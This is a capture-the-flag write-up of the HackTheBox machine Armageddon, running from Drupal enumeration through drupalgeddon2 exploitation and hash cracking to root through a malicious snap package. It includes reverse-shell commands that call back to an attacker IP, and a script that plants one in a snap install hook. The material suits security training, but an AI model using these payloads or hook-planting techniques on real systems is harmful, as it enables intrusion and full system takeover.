---
title: Armageddon HackTheBox Writeup
tags: [writeup,hackthebox,drupal,drupalgeddon2,snap]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/1.png)

## Scanning
We run nmap on all ports with scripts and software versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/2.png)

## Enumeration
We access the web resource, we find a website designed in Drupal (as we had previously seen in nmap).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/3.png)

We list the deployed version of Drupal, an attacker would manage to list public exploits to abuse vulnerabilities in this version.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/4.png)

## Exploitation

#####  Exploit: [drupalgeddon2](https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py)

### PoC

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/5.png)

### Reverse shell code
``` bash
python drupalgeddon2.py -h http://10.10.10.233 -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/6.png)

We review the "*settings.php*" file and list the database credentials. This is highly recommended, as there is a possibility of password reuse.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/7.png)

So, we list the users and try the password, but it doesn't work.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/8.png)

We dump the DDBB data and find the hash of the Drupal user "*brucetherealadmin*".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/10.png)

### Cracking hash
We crack the hash with **john** and **rockyou** dictionary and get the credentials in plain text.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/11.png)

We access by **SSH** and read the flag of "*user.txt*".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/12.png)


## Privilege Escalation
We run the command "sudo -l", we see that we can install snaps as the root user.

We search for information on Google, we see that we can create a malicious snap package and run it as the user with elevated privileges.

### PoC
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/13.png)

Great, we could read the "*root.txt*" file directly, but we would not be squeezing the most out of the machine.

So, we'll use the following lines to *create a malicious snap package* to give us a reverse shell on our kali.

```bash
COMMAND='bash -i >& /dev/tcp/10.10.14.15/555 0>&1'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/bash\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n m3n0s -s dir -t snap -a all meta
```

We set up a *python server* on our kali and transfer the file with **curl**. Now we run **snap** with **sudo**, wait to receive our reverse shell as root and read the root flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Armageddon/14.png)




